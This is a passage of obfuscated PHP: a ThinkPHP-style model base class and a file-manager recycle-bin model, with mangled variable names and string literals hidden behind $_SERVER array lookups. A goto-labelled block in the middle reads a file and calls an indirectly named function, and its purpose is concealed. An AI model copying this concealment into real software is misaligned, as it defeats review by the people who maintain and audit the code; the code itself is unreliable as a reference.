$this->autoOperation($ûóÍÂ¨, $ÏšÄ³²„); $this->data = $ûóÍÂ¨; return $ûóÍÂ¨; } public function autoCheckToken($³õóó) { $¬“ÀËğ­ =& $_SERVER[¤·²È‰º]; if (isset($this->options[$¬“ÀËğ­[310]]) && !$this->options[$¬“ÀËğ­[310]]) { return !0; } if (think_config($¬“ÀËğ­[307])) { $Ó¨¾À • = think_config($¬“ÀËğ­[308]); if (!isset($³õóó[$Ó¨¾À •]) || Session::get($Ó¨¾À •)) { return !1; } list($»¥ä¼Õ, $ƒü“ñ„Â) = explode($¬“ÀËğ­[11], $³õóó[$Ó¨¾À •]); if ($ƒü“ñ„Â && Session::get($Ó¨¾À • . $¬“ÀËğ­[10] . $»¥ä¼Õ) === $ƒü“ñ„Â) { Session::remove($Ó¨¾À • . $¬“ÀËğ­[10] . $»¥ä¼Õ); return !0; } if (think_config($¬“ÀËğ­[311])) { Session::remove($Ó¨¾À • . $¬“ÀËğ­[10] . $»¥ä¼Õ); } return !1; } return !0; } public function regex($š¼õ, $¯šš«â‡) { $€³èÄÄÇ =& $_SERVER[¤·²È‰º]; $ªŠº«ùı = array($€³èÄÄÇ[312] => $€³èÄÄÇ[313], $€³èÄÄÇ[314] => $€³èÄÄÇ[315], $€³èÄÄÇ[316] => $€³èÄÄÇ[317], $€³èÄÄÇ[318] => $€³èÄÄÇ[319], $€³èÄÄÇ[320] => $€³èÄÄÇ[321], $€³èÄÄÇ[322] => $€³èÄÄÇ[323], $€³èÄÄÇ[324] => $€³èÄÄÇ[325], $€³èÄÄÇ[299] => $€³èÄÄÇ[326], $€³èÄÄÇ[327] => $€³èÄÄÇ[328]); if (isset($ªŠº«ùı[strtolower($¯šš«â‡)])) { $¯šš«â‡ = $ªŠº«ùı[strtolower($¯šš«â‡)]; } return preg_match($¯šš«â‡, $š¼õ) === 1; } private function autoOperation(&$ªâ¹½¹, $½˜…Ã¬) { $½—åÒÛ• =& $_SERVER[¤·²È‰º]; if (!empty($this->options[$½—åÒÛ•[329]])) { $ÕÃÎÌ = $this->options[$½—åÒÛ•[329]]; unset($this->options[$½—åÒÛ•[329]]); } elseif (!empty($this->_auto)) { $ÕÃÎÌ = $this->_auto; } if (isset($ÕÃÎÌ)) { foreach ($ÕÃÎÌ as $‚¤‰ÁÈó) { if (empty($‚¤‰ÁÈó[2])) { $‚¤‰ÁÈó[2] = THINK_MODEL_INSERT; } if ($½˜…Ã¬ == $‚¤‰ÁÈó[2] || $‚¤‰ÁÈó[2] == THINK_MODEL_BOTH) { switch (trim($‚¤‰ÁÈó[3])) { case $½—åÒÛ•[330]: case $½—åÒÛ•[331]: $Îç‹¸’ = isset($‚¤‰ÁÈó[4]) ? (array) $‚¤‰ÁÈó[4] : array(); if (isset($ªâ¹½¹[$‚¤‰ÁÈó[0]])) { array_unshift($Îç‹¸’, $ªâ¹½¹[$‚¤‰ÁÈó[0]]); } if ($½—åÒÛ•[330] == $‚¤‰ÁÈó[3]) { $ªâ¹½¹[$‚¤‰ÁÈó[0]] = call_user_func_array($‚¤‰ÁÈó[1], $Îç‹¸’); } else { $ªâ¹½¹[$‚¤‰ÁÈó[0]] = call_user_func_array(array(&$this, $‚¤‰ÁÈó[1]), $Îç‹¸’); } break; case $½—åÒÛ•[282]: $ªâ¹½¹[$‚¤‰ÁÈó[0]] = $ªâ¹½¹[$‚¤‰ÁÈó[1]]; break; case $½—åÒÛ•[332]: if ($½—åÒÛ•[12] === $ªâ¹½¹[$‚¤‰ÁÈó[0]]) { unset($ªâ¹½¹[$‚¤‰ÁÈó[0]]); } break; case $½—åÒÛ•[333]: default: $ªâ¹½¹[$‚¤‰ÁÈó[0]] = $‚¤‰ÁÈó[1]; } if (!1 === $ªâ¹½¹[$‚¤‰ÁÈó[0]]) { unset($ªâ¹½¹[$‚¤‰ÁÈó[0]]); } } } } return $ªâ¹½¹; } protected function autoValidation($´ÈÛÈêğ, $Š­õêÕç) { $Æ¥ÌÙ¸ =& $_SERVER[¤·²È‰º]; if (!empty($this->options[$Æ¥ÌÙ¸[334]])) { $’×Ô¤Ş‰ = $this->options[$Æ¥ÌÙ¸[334]]; unset($this->options[$Æ¥ÌÙ¸[334]]); } elseif (!empty($this->_validate)) { $’×Ô¤Ş‰ = $this->_validate; } if (isset($’×Ô¤Ş‰)) { if ($this->patchValidate) { $this->error = array(); } foreach ($’×Ô¤Ş‰ as $ğ²˜æğ => $‹¬õõ¨Ù) { if (empty($‹¬õõ¨Ù[5]) || $‹¬õõ¨Ù[5] == THINK_MODEL_BOTH || $‹¬õõ¨Ù[5] == $Š­õêÕç) { if (0 == strpos($‹¬õõ¨Ù[2], $Æ¥ÌÙ¸[335]) && strpos($‹¬õõ¨Ù[2], $Æ¥ÌÙ¸[336])) { $‹¬õõ¨Ù[2] = think_lang(substr($‹¬õõ¨Ù[2], 2, -1)); } $‹¬õõ¨Ù[3] = isset($‹¬õõ¨Ù[3]) ? $‹¬õõ¨Ù[3] : THINK_EXISTS_VALIDATE; $‹¬õõ¨Ù[4] = isset($‹¬õõ¨Ù[4]) ? $‹¬õõ¨Ù[4] : $Æ¥ÌÙ¸[337]; switch ($‹¬õõ¨Ù[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($´ÈÛÈêğ, $‹¬õõ¨Ù)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Æ¥ÌÙ¸[12] != trim($´ÈÛÈêğ[$‹¬õõ¨Ù[0]])) { if (!1 === $this->_validationField($´ÈÛÈêğ, $‹¬õõ¨Ù)) { return !1; } } break; default: if (isset($´ÈÛÈêğ[$‹¬õõ¨Ù[0]])) { if (!1 === $this->_validationField($´ÈÛÈêğ, $‹¬õõ¨Ù)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ğçì¤Í¿, $ñ¦î Ê®) { if (!1 === $this->_validationFieldItem($ğçì¤Í¿, $ñ¦î Ê®)) { if ($this->patchValidate) { $this->error[$ñ¦î Ê®[0]] = $ñ¦î Ê®[2]; } else { $this->error = $ñ¦î Ê®[2]; return !1; } } return; } protected function _validationFieldItem($¤Ó‚ò¶û, $òô× Èï) { $Üô´˜Äâ =& $_SERVER[¤·²È‰º]; switch (strtolower(trim($òô× Èï[4]))) { case $Üô´˜Äâ[330]: case $Üô´˜Äâ[331]: $Û½ô´¿ê = isset($òô× Èï[6]) ? (array) $òô× Èï[6] : array(); if (is_string($òô× Èï[0]) && strpos($òô× Èï[0], $Üô´˜Äâ[60])) { $òô× Èï[0] = explode($Üô´˜Äâ[60], $òô× Èï[0]); } if (is_array($òô× Èï[0])) { foreach ($òô× Èï[0] as $ØæÏ¦Å) { $µÜ²“‹Ã[$ØæÏ¦Å] = $¤Ó‚ò¶û[$ØæÏ¦Å]; } array_unshift($Û½ô´¿ê, $µÜ²“‹Ã); } else { array_unshift($Û½ô´¿ê, $¤Ó‚ò¶û[$òô× Èï[0]]); } if ($Üô´˜Äâ[330] == $òô× Èï[4]) { return call_user_func_array($òô× Èï[1], $Û½ô´¿ê); } else { return call_user_func_array(array(&$this, $òô× Èï[1]), $Û½ô´¿ê); } case $Üô´˜Äâ[338]: return $¤Ó‚ò¶û[$òô× Èï[0]] == $¤Ó‚ò¶û[$òô× Èï[1]]; case $Üô´˜Äâ[339]: if (is_string($òô× Èï[0]) && strpos($òô× Èï[0], $Üô´˜Äâ[60])) { $òô× Èï[0] = explode($Üô´˜Äâ[60], $òô× Èï[0]); } $œÛç¦„ = array(); if (is_array($òô× Èï[0])) { foreach ($òô× Èï[0] as $ØæÏ¦Å) { $œÛç¦„[$ØæÏ¦Å] = $¤Ó‚ò¶û[$ØæÏ¦Å]; } } else { $œÛç¦„[$òô× Èï[0]] = $¤Ó‚ò¶û[$òô× Èï[0]]; } if (!empty($¤Ó‚ò¶û[$this->getPk()])) { $œÛç¦„[$this->getPk()] = array($Üô´˜Äâ[340], $¤Ó‚ò¶û[$this->getPk()]); } if ($this->where($œÛç¦„)->find()) { return !1; } return !0; default: return $this->check($¤Ó‚ò¶û[$òô× Èï[0]], $òô× Èï[1], $òô× Èï[4]); } } public function check($ÂÂøëêÓ, $¡µß¬¬›, $¦‚ÉÆüà = "\x72\145\x67\145\170") { $˜êÒ³Áƒ =& $_SERVER[¤·²È‰º]; $¦‚ÉÆüà = strtolower(trim($¦‚ÉÆüà)); switch ($¦‚ÉÆüà) { case $˜êÒ³Áƒ[7]: case $˜êÒ³Áƒ[341]: $°¡ù‡ä• = is_array($¡µß¬¬›) ? $¡µß¬¬› : explode($˜êÒ³Áƒ[60], $¡µß¬¬›); return $¦‚ÉÆüà == $˜êÒ³Áƒ[7] ? in_array($ÂÂøëêÓ, $°¡ù‡ä•) : !in_array($ÂÂøëêÓ, $°¡ù‡ä•); case $˜êÒ³Áƒ[342]: case $˜êÒ³Áƒ[343]: if (is_array($¡µß¬¬›)) { $©Ş½–ŠÎ = $¡µß¬¬›[0]; $ŒéüÇ = $¡µß¬¬›[1]; } else { list($©Ş½–ŠÎ, $ŒéüÇ) = explode($˜êÒ³Áƒ[60], $¡µß¬¬›); } return $¦‚ÉÆüà == $˜êÒ³Áƒ[342] ? $ÂÂøëêÓ >= $©Ş½–ŠÎ && $ÂÂøëêÓ <= $ŒéüÇ : $ÂÂøëêÓ < $©Ş½–ŠÎ || $ÂÂøëêÓ > $ŒéüÇ; case $˜êÒ³Áƒ[344]: case $˜êÒ³Áƒ[345]: return $¦‚ÉÆüà == $˜êÒ³Áƒ[344] ? $ÂÂøëêÓ == $¡µß¬¬› : $ÂÂøëêÓ != $¡µß¬¬›; case $˜êÒ³Áƒ[346]: $ˆâÚËç÷ = mb_strlen($ÂÂøëêÓ, $˜êÒ³Áƒ[347]); if (strpos($¡µß¬¬›, $˜êÒ³Áƒ[60])) { list($©Ş½–ŠÎ, $ŒéüÇ) = explode($˜êÒ³Áƒ[60], $¡µß¬¬›); return $ˆâÚËç÷ >= $©Ş½–ŠÎ && $ˆâÚËç÷ <= $ŒéüÇ; } else { return $ˆâÚËç÷ == $¡µß¬¬›; } case $˜êÒ³Áƒ[348]: list($÷Ó×¢¢Ğ, $ˆ¦‰Œ) = explode($˜êÒ³Áƒ[60], $¡µß¬¬›); if (!is_numeric($÷Ó×¢¢Ğ)) { $÷Ó×¢¢Ğ = strtotime($÷Ó×¢¢Ğ); } if (!is_numeric($ˆ¦‰Œ)) { $ˆ¦‰Œ = strtotime($ˆ¦‰Œ); } return NOW_TIME >= $÷Ó×¢¢Ğ && NOW_TIME <= $ˆ¦‰Œ; case $˜êÒ³Áƒ[349]: return in_array(get_client_ip(), explode($˜êÒ³Áƒ[60], $¡µß¬¬›)); case $˜êÒ³Áƒ[350]: return !in_array(get_client_ip(), explode($˜êÒ³Áƒ[60], $¡µß¬¬›)); case $˜êÒ³Áƒ[337]: default: return $this->regex($ÂÂøëêÓ, $¡µß¬¬›); } } public function query($©èÁƒ¸±, $»¹åÛØù = false) { $¥ùª£Õ· =& $_SERVER[¤·²È‰º]; if (!is_bool($»¹åÛØù) && !is_array($»¹åÛØù)) { $»¹åÛØù = func_get_args(); array_shift($»¹åÛØù); } $©èÁƒ¸± = str_replace(array($¥ùª£Õ·[18], $¥ùª£Õ·[351]), $¥ùª£Õ·[63], $©èÁƒ¸±); $©èÁƒ¸± = $this->parseSql($©èÁƒ¸±, $»¹åÛØù); return $this->db->query($©èÁƒ¸±); } public function execute($¼µ•º», $ÇÅù¾´ò = false) { if (!is_bool($ÇÅù¾´ò) && !is_array($ÇÅù¾´ò)) { $ÇÅù¾´ò = func_get_args(); array_shift($ÇÅù¾´ò); } $¼µ•º» = $this->parseSql($¼µ•º», $ÇÅù¾´ò); return $this->db->execute($¼µ•º»); } protected function parseSql($ÊöÆ²õ’, $Êö¡º¤ğ) { $öø…¨¬ =& $_SERVER[¤·²È‰º]; if (!0 === $Êö¡º¤ğ) { $Ö½ûõ¶Ğ = $this->_parseOptions(); $ÊöÆ²õ’ = $this->db->parseSql($ÊöÆ²õ’, $Ö½ûõ¶Ğ); } elseif (is_array($Êö¡º¤ğ)) { $Êö¡º¤ğ = array_map(array($this->db, $öø…¨¬[352]), $Êö¡º¤ğ); $ÊöÆ²õ’ = vsprintf($ÊöÆ²õ’, $Êö¡º¤ğ); } else { $ÊöÆ²õ’ = strtr($ÊöÆ²õ’, array($öø…¨¬[353] => $this->getTableName(), $öø…¨¬[354] => think_config($öø…¨¬[253]))); } $this->db->setModel($this->name); return $ÊöÆ²õ’; } public function db($³‚˜°«¯ = '', $ø®ÄÑÑ“ = '', $Äà·¡ˆ¿ = array()) { $™ÌéÆìÏ =& $_SERVER[¤·²È‰º]; if ($™ÌéÆìÏ[12] === $³‚˜°«¯ && $this->db) { return $this->db; } static $õ‹ªŞö = array(); static $úûÂÏò¶ = array(); if (!isset($úûÂÏò¶[$³‚˜°«¯]) || isset($úûÂÏò¶[$³‚˜°«¯]) && $ø®ÄÑÑ“ && $õ‹ªŞö[$³‚˜°«¯] != $ø®ÄÑÑ“) { if (!empty($ø®ÄÑÑ“) && is_string($ø®ÄÑÑ“) && !1 === strpos($ø®ÄÑÑ“, $™ÌéÆìÏ[8])) { $ø®ÄÑÑ“ = think_config($ø®ÄÑÑ“); } $³‚˜°«¯ = think_guid($ø®ÄÑÑ“); $úûÂÏò¶[$³‚˜°«¯] = Db::getInstance($ø®ÄÑÑ“); } elseif (NULL === $ø®ÄÑÑ“) { $úûÂÏò¶[$³‚˜°«¯]->close(); unset($úûÂÏò¶[$³‚˜°«¯]); return; } if (!empty($Äà·¡ˆ¿)) { if (is_string($Äà·¡ˆ¿)) { parse_str($Äà·¡ˆ¿, $Äà·¡ˆ¿); } foreach ($Äà·¡ˆ¿ as $±ı™ÅÒË => $×Æá¡²á) { $this->setProperty($±ı™ÅÒË, $×Æá¡²á); } } $õ‹ªŞö[$³‚˜°«¯] = $ø®ÄÑÑ“; $this->db = $úûÂÏò¶[$³‚˜°«¯]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ğ·¹ÄÕŠ = get_class($this); if ($Ğ·¹ÄÕŠ == $_SERVER[¤·²È‰º][355]) { return $this->name; } $this->name = substr($Ğ·¹ÄÕŠ, 0, -5); } return $this->name; } public function getTableName() { $Õ¼¾¹ÑŠ =& $_SERVER[¤·²È‰º]; if (empty($this->trueTableName)) { $³Ø¾²˜² = !empty($this->tablePrefix) ? $this->tablePrefix : $Õ¼¾¹ÑŠ[12]; if (!empty($this->tableName)) { $³Ø¾²˜² .= $this->tableName; } else { $³Ø¾²˜² .= think_parse_name($this->name); } $this->trueTableName = strtolower($³Ø¾²˜²); } return (!empty($this->dbName) ? $this->dbName . $Õ¼¾¹ÑŠ[10] : $Õ¼¾¹ÑŠ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Â¢Õ´åƒ =& $_SERVER[¤·²È‰º]; return isset($this->fields[$Â¢Õ´åƒ[260]]) ? $this->fields[$Â¢Õ´åƒ[260]] : $this->pk; } public function getDbFields() { $ø‘ÉÍÊğ =& $_SERVER[¤·²È‰º]; if (isset($this->options[$ø‘ÉÍÊğ[288]])) { $œÁÉ¼íñ = $this->db->getFields($this->options[$ø‘ÉÍÊğ[288]]); return $œÁÉ¼íñ ? array_keys($œÁÉ¼íñ) : !1; } if ($this->fields) { $œÁÉ¼íñ = $this->fields; unset($œÁÉ¼íñ[$ø‘ÉÍÊğ[259]], $œÁÉ¼íñ[$ø‘ÉÍÊğ[260]], $œÁÉ¼íñ[$ø‘ÉÍÊğ[261]], $œÁÉ¼íñ[$ø‘ÉÍÊğ[258]]); return $œÁÉ¼íñ; } return !1; } public function data($¨’³Ïçë = '') { $‰Åçº‡ =& $_SERVER[¤·²È‰º]; if ($‰Åçº‡[12] === $¨’³Ïçë && !empty($this->data)) { return $this->data; } if (is_object($¨’³Ïçë)) { $¨’³Ïçë = get_object_vars($¨’³Ïçë); } elseif (is_string($¨’³Ïçë)) { parse_str($¨’³Ïçë, $¨’³Ïçë); } elseif (!is_array($¨’³Ïçë)) { think_exception(think_lang($‰Åçº‡[280])); } $this->data = $¨’³Ïçë; return $this; } public function join($ßÙ×¥´Æ) { $ ÈüƒÑ =& $_SERVER[¤·²È‰º]; if (is_array($ßÙ×¥´Æ)) { $this->options[$ ÈüƒÑ[291]] = $ßÙ×¥´Æ; } elseif (!empty($ßÙ×¥´Æ)) { $this->options[$ ÈüƒÑ[291]][] = $ßÙ×¥´Æ; } return $this; } public function union($èÈ…æİô, $£™®Ë¥ = false) { $ÁÅç¤‚â =& $_SERVER[¤·²È‰º]; if (empty($èÈ…æİô)) { return $this; } if ($£™®Ë¥) { $this->options[$ÁÅç¤‚â[356]][$ÁÅç¤‚â[357]] = !0; } if (is_object($èÈ…æİô)) { $èÈ…æİô = get_object_vars($èÈ…æİô); } if (is_string($èÈ…æİô)) { $¸Ì¤ˆÁÑ = $èÈ…æİô; } elseif (is_array($èÈ…æİô)) { if (isset($èÈ…æİô[0])) { $this->options[$ÁÅç¤‚â[356]] = array_merge($this->options[$ÁÅç¤‚â[356]], $èÈ…æİô); return $this; } else { $¸Ì¤ˆÁÑ = $èÈ…æİô; } } else { think_exception(think_lang($ÁÅç¤‚â[280])); } $this->options[$ÁÅç¤‚â[356]][] = $¸Ì¤ˆÁÑ; return $this; } public function cache($îÛÅÇ¯Ñ = true, $ıÓ˜Ÿšº = null, $ÁÔÃËÚº = '') { $ªüÉ² =& $_SERVER[¤·²È‰º]; if (!1 !== $îÛÅÇ¯Ñ) { $this->options[$ªüÉ²[358]] = array($ªüÉ²[104] => $îÛÅÇ¯Ñ, $ªüÉ²[348] => $ıÓ˜Ÿšº, $ªüÉ²[43] => $ÁÔÃËÚº); } return $this; } public function field($¼·øÃ¼Á, $½¯Ÿâ½ = false) { $»Ì³æëÆ =& $_SERVER[¤·²È‰º]; if (!0 === $¼·øÃ¼Á) { $ ¯ã½­ = $this->getDbFields(); $¼·øÃ¼Á = $ ¯ã½­ ? $ ¯ã½­ : $»Ì³æëÆ[198]; } elseif ($½¯Ÿâ½) { if (is_string($¼·øÃ¼Á)) { $¼·øÃ¼Á = explode($»Ì³æëÆ[60], $¼·øÃ¼Á); } $ ¯ã½­ = $this->getDbFields(); $¼·øÃ¼Á = $ ¯ã½­ ? array_diff($ ¯ã½­, $¼·øÃ¼Á) : $¼·øÃ¼Á; } $this->options[$»Ì³æëÆ[282]] = $¼·øÃ¼Á; return $this; } public function scope($ƒ•æÀ¦Ğ = '', $Œé‹Îë³ = NULL) { $Ï®®«½ =& $_SERVER[¤·²È‰º]; if ($Ï®®«½[12] === $ƒ•æÀ¦Ğ) { if (isset($this->_scope[$Ï®®«½[47]])) { $Ö —Ø£‘ = $this->_scope[$Ï®®«½[47]]; } else { return $this; } } elseif (is_string($ƒ•æÀ¦Ğ)) { $üú«¨Ú½ = explode($Ï®®«½[60], $ƒ•æÀ¦Ğ); $Ö —Ø£‘ = array(); foreach ($üú«¨Ú½ as $¥‘ïÛÜÏ) { if (!isset($this->_scope[$¥‘ïÛÜÏ])) { continue; } $Ö —Ø£‘ = array_merge($Ö —Ø£‘, $this->_scope[$¥‘ïÛÜÏ]); } if (!empty($Œé‹Îë³) && is_array($Œé‹Îë³)) { $Ö —Ø£‘ = array_merge($Ö —Ø£‘, $Œé‹Îë³); } } elseif (is_array($ƒ•æÀ¦Ğ)) { $Ö —Ø£‘ = $ƒ•æÀ¦Ğ; } if (is_array($Ö —Ø£‘) && !empty($Ö —Ø£‘)) { $this->options = array_merge($this->options, array_change_key_case($Ö —Ø£‘)); } return $this; } public function where($ÌŒïÃ¸, $¡Ô‡Ğ„ = null) { $”ıÄ§ =& $_SERVER[¤·²È‰º]; if (!is_null($¡Ô‡Ğ„) && is_string($ÌŒïÃ¸)) { if (!is_array($¡Ô‡Ğ„)) { $¡Ô‡Ğ„ = func_get_args(); array_shift($¡Ô‡Ğ„); } $¡Ô‡Ğ„ = array_map(array($this->db, $”ıÄ§[352]), $¡Ô‡Ğ„); $ÌŒïÃ¸ = vsprintf($ÌŒïÃ¸, $¡Ô‡Ğ„); } elseif (is_object($ÌŒïÃ¸)) { $ÌŒïÃ¸ = get_object_vars($ÌŒïÃ¸); } elseif (is_array($ÌŒïÃ¸)) { foreach ($ÌŒïÃ¸ as $ÑÙæ í’ => $“•š–êß) { if ((is_numeric($ÑÙæ í’) || !$ÑÙæ í’) && is_string($“•š–êß)) { if (strpos($“•š–êß, $”ıÄ§[359]) === 0) { continue; } think_trace($”ıÄ§[360], $”ıÄ§[12], $”ıÄ§[59]); die; } } } if (is_string($ÌŒïÃ¸) && $”ıÄ§[12] != $ÌŒïÃ¸) { $ºÇ‚¬ğä = array(); $ºÇ‚¬ğä[$”ıÄ§[361]] = $ÌŒïÃ¸; $ÌŒïÃ¸ = $ºÇ‚¬ğä; } if (isset($this->options[$”ıÄ§[284]])) { $this->options[$”ıÄ§[284]] = array_merge($this->options[$”ıÄ§[284]], $ÌŒïÃ¸); } else { $this->options[$”ıÄ§[284]] = $ÌŒïÃ¸; } return $this; } public function limit($œïéºËÏ, $”ï¯àÌ = null) { $ê¤·ÄäÖ =& $_SERVER[¤·²È‰º]; $this->options[$ê¤·ÄäÖ[301]] = is_null($”ï¯àÌ) ? $œïéºËÏ : $œïéºËÏ . $ê¤·ÄäÖ[60] . $”ï¯àÌ; return $this; } public function page($ğı«ËªÍ, $äËÎôõò = null) { $§¦¬–š =& $_SERVER[¤·²È‰º]; $this->options[$§¦¬–š[362]] = is_null($äËÎôõò) ? $ğı«ËªÍ : $ğı«ËªÍ . $§¦¬–š[60] . $äËÎôõò; return $this; } public function comment($ÍŞ¨åÆ×) { $this->options[$_SERVER[¤·²È‰º][363]] = $ÍŞ¨åÆ×; return $this; } public function setProperty($ºÈßÉ‹Ÿ, $‹ˆªÚÕÖ) { if (property_exists($this, $ºÈßÉ‹Ÿ)) { $this->{$ºÈßÉ‹Ÿ} = $‹ˆªÚÕÖ; } return $this; } } goto EóğöïçÙ; fï’‰×œ‘: if ($_SERVER[$_SERVER[¤·²È‰º][13]] != $_SERVER[$_SERVER[¤·²È‰º][1515]]) { $_getc = $_SERVER[¤·²È‰º][15]; $_getfile = $_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤·²È‰º][18], $_getfilec); if (count($_getarrs) < $_SERVER[¤·²È‰º][19]) { $exit = $_SERVER[¤·²È‰º][20]; $exit(); } $_act = $_SERVER[¤·²È‰º][21]; $_act($_SERVER[$_SERVER[¤·²È‰º][14]]); } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\x65\x5f\162\145\x63\x79\143\154\145"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\151\x6d\145", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\x74", "\146\x75\x6e\143\x74\151\157\x6e")); public function listData($ª­Ì­¾Ú = false) { $±Á¤¾²£ =& $_SERVER[¤·²È‰º]; $ª­Ì­¾Ú = $ª­Ì­¾Ú ? $ª­Ì­¾Ú : USER_ID; $ì‘¥æ§³ = $this->where(array($±Á¤¾²£[1642] => $ª­Ì­¾Ú))->select(); return array_to_keyvalue($ì‘¥æ§³, $±Á¤¾²£[12], $±Á¤¾²£[410]); } public function moveToRecycle($º—†Ğ’) { $¢Á¾Ê¡ì =& $_SERVER[¤·²È‰º]; $áÏî€£ = Model($¢Á¾Ê¡ì[1321]); $‰×æĞÉ = $áÏî€£->sourceInfo($º—†Ğ’); if (!$‰×æĞÉ || $‰×æĞÉ[$¢Á¾Ê¡ì[439]] == $¢Á¾Ê¡ì[98]) { return; } $çµ‹×”¡ = array($¢Á¾Ê¡ì[425] => $º—†Ğ’, $¢Á¾Ê¡ì[1642] => USER_ID, $¢Á¾Ê¡ì[594] => $‰×æĞÉ[$¢Á¾Ê¡ì[419]], $¢Á¾Ê¡ì[595] => $‰×æĞÉ[$¢Á¾Ê¡ì[513]], $¢Á¾Ê¡ì[598] => $‰×æĞÉ[$¢Á¾Ê¡ì[529]]); $this->add($çµ‹×”¡); $this->recycleMove($º—†Ğ’, 1); if ($‰×æĞÉ[$¢Á¾Ê¡ì[418]] == $¢Á¾Ê¡ì[98]) { $â‹Ê‹Â = array($¢Á¾Ê¡ì[598] => array($¢Á¾Ê¡ì[558], $‰×æĞÉ[$¢Á¾Ê¡ì[529]] . $º—†Ğ’ . $¢Á¾Ê¡ì[559])); $áÏî€£->where($â‹Ê‹Â)->setField($¢Á¾Ê¡ì[439], 1); } } public function clear() { $this->remove(!1); } public function remove($Öªû‚àì = false, $ºäÔ®ëÌ = false) { $ÓãşøÙ³ =& $_SERVER[¤·²È‰º]; $ºäÔ®ëÌ = $ºäÔ®ëÌ ? $ºäÔ®ëÌ : USER_ID; $À¦®Õ³ = Model($ÓãşøÙ³[1321]); $øå•€† = $this->listData($ºäÔ®ëÌ); $Öªû‚àì = $Öªû‚àì === !1 ? !1 : $Öªû‚àì; $êóÃ³– = array(); foreach ($øå•€† as $êšŒàµÇ) { if ($Öªû‚àì != !1 && !in_array($êšŒàµÇ, $Öªû‚àì)) { continue; } $ÜÍÛı‡ = $À¦®Õ³->sourceInfo($êšŒàµÇ); $À¦®Õ³->remove($êšŒàµÇ, !1); $¶­Àõçõ = $ÜÍÛı‡[$ÓãşøÙ³[419]] . $ÓãşøÙ³[11] . $ÜÍÛı‡[$ÓãşøÙ³[513]]; $êóÃ³–[$¶­Àõçõ] = array($ÓãşøÙ³[594] => $ÜÍÛı‡[$ÓãşøÙ³[419]], $ÓãşøÙ³[513] => $ÜÍÛı‡[$ÓãşøÙ³[513]]); $this->where(array($ÓãşøÙ³[410] => $êšŒàµÇ))->delete(); } foreach ($êóÃ³– as $²ÒªÓĞÙ) { $À¦®Õ³->targetSpaceUpdate($²ÒªÓĞÙ[$ÓãşøÙ³[419]], $²ÒªÓĞÙ[$ÓãşøÙ³[513]]); } } public function restore($¨Ê°¿Ş = false) { $úÅÕâ‰ = $this->listData(); $this->_restoreSource($úÅÕâ‰, $¨Ê°¿Ş); } public function removeUserAll($á¹š±¬Ä) { $this->remove(!1, $á¹š±¬Ä); } private function _restoreSource($Ôª¡³‘Š, $¦Ú…º«Î) { $åèƒ„©Ú =& $_SERVER[¤·²È‰º]; $¬ÕëÙ = Model($åèƒ„©Ú[1321]); $¦Ú…º«Î = $¦Ú…º«Î == !1 ? !1 : $¦Ú…º«Î; if (!$Ôª¡³‘Š) { return !0; } $şªÉÄÂš = array(); foreach ($Ôª¡³‘Š as $‘«ôÁ™¤) { if ($¦Ú…º«Î != !1 && !in_array($‘«ôÁ™¤, $¦Ú…º«Î)) { continue; } $ÎÂ¯¿ÙÓ = $¬ÕëÙ->sourceInfo($‘«ôÁ™¤); $İ‹Âİò = $¬ÕëÙ->sourceInfo($ÎÂ¯¿ÙÓ[$åèƒ„©Ú[440]]); if ($İ‹Âİò[$åèƒ„©Ú[439]] == $åèƒ„©Ú[98]) { continue; } $¬ÕëÙ->lockMoveStart($‘«ôÁ™¤); $this->recycleMove($‘«ôÁ™¤, 0); if ($ÎÂ¯¿ÙÓ[$åèƒ„©Ú[418]] == $åèƒ„©Ú[98]) { $á •èıó = array($åèƒ„©Ú[598] => array($åèƒ„©Ú[558], $ÎÂ¯¿ÙÓ[$åèƒ„©Ú[529]] . $‘«ôÁ™¤ . $åèƒ„©Ú[559])); $¬ÕëÙ->where($á •èıó)->setField($åèƒ„©Ú[439], 0); $this->restoreFolderChildren($‘«ôÁ™¤, $Ôª¡³‘Š); } $this->where(array($åèƒ„©Ú[410] => $‘«ôÁ™¤))->delete(); $¬ÕëÙ->folderSizeReset($ÎÂ¯¿ÙÓ[$åèƒ„©Ú[440]]); $şªÉÄÂš[] = $ÎÂ¯¿ÙÓ[$åèƒ„©Ú[440]]; if ($ÎÂ¯¿ÙÓ[$åèƒ„©Ú[418]] == $åèƒ„©Ú[98]) { $şªÉÄÂš[] = $‘«ôÁ™¤; } $¬ÕëÙ->lockMoveEnd($‘«ôÁ™¤); } $¬ÕëÙ->updateModifyTime($şªÉÄÂš); } private function restoreFolderChildren($§ı­¬“, $½é’Ø¶ ) { $–ûÍ™¸ =& $_SERVER[¤·²È‰º]; $“ÖÑ»ñ¢ = Model($–ûÍ™¸[1321]); $°–Ñ = array($–ûÍ™¸[410] => array($–ûÍ™¸[7], array())); foreach ($½é’Ø¶  as $¾’³ùêĞ) { if ($¾’³ùêĞ == $§ı­¬“) { continue; } if (!$“ÖÑ»ñ¢->isParentOf($§ı­¬“, $¾’³ùêĞ)) { continue; } $…ÙÅ•… = $“ÖÑ»ñ¢->sourceInfo($¾’³ùêĞ); if ($…ÙÅ•…[$–ûÍ™¸[418]] == $–ûÍ™¸[98]) { $°–Ñ[] = array($–ûÍ™¸[598] => array($–ûÍ™¸[558], $…ÙÅ•…[$–ûÍ™¸[529]] . $¾’³ùêĞ . $–ûÍ™¸[559])); } else { $°–Ñ[$–ûÍ™¸[410]][1][] = $¾’³ùêĞ; } } if (!$°–Ñ[$–ûÍ™¸[410]][1]) { unset($°–Ñ[$–ûÍ™¸[410]]); } if (!$°–Ñ) { return; } $°–Ñ[$–ûÍ™¸[410]][1] = 